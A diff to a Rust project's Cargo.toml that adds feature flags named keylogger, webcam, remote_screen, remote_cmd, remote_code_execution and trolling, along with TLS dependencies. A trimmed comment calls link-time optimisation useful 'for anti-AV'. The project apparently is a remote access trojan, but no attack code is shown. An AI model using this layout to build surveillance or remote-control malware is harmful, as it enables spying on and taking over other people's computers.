@@ -6,13 +6,24 @@ edition = "2024"
 
 [profile.release]
 strip = true      #deletes debuginfo
-lto = true        # can change code structure, usable for anti-AV
+lto = true        # can change code structure,
 codegen-units = 1 # more aggressive optimizations
 panic = "abort"   #no info when panicking
 
 [features]
-default = ["dev-logs"]
+default = ["dev-logs","remote_cmd", "files", "chat"]
+
 dev-logs = []
+audio = []
+files = []
+remote_screen = []
+remote_cmd = []
+task_manager = []
+webcam = []
+chat = []
+keylogger = []
+remote_code_execution= []
+trolling = []
 
 [dependencies]
 tokio = { version = "1.39.1", features = ["full"] }
@@ -47,3 +58,12 @@ winit = { version = "0.30.11", default-features = false, features = [
     "x11",
     "wayland",
 ] }
+
+rustls = { version = "0.23", default-features = false, features = ["logging"] }
+rustls-native-certs = "0.7"
+rustls-pemfile = "2.1"
+webpki-roots = "0.26"
+ring = "0.17"
+x509-parser = "0.15"
+base64 = "0.22.1"
+futures = "0.3.31"
